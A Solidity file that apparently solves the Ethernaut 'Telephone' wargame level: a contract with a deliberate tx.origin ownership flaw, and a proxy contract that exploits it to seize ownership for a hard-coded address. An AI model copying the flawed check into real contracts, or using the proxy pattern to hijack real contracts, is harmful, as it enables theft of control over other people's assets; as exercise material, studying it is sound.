// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneProxy {
    Telephone telephone = Telephone(0xec493d3F78335d90231E44a0656fbe455cF4a8EF);

    function changeOwnerProxy() public {
        address _owner = 0x84D14a8480737c223168B083Bcda189aC7783010;

        telephone.changeOwner(_owner);
    }
}
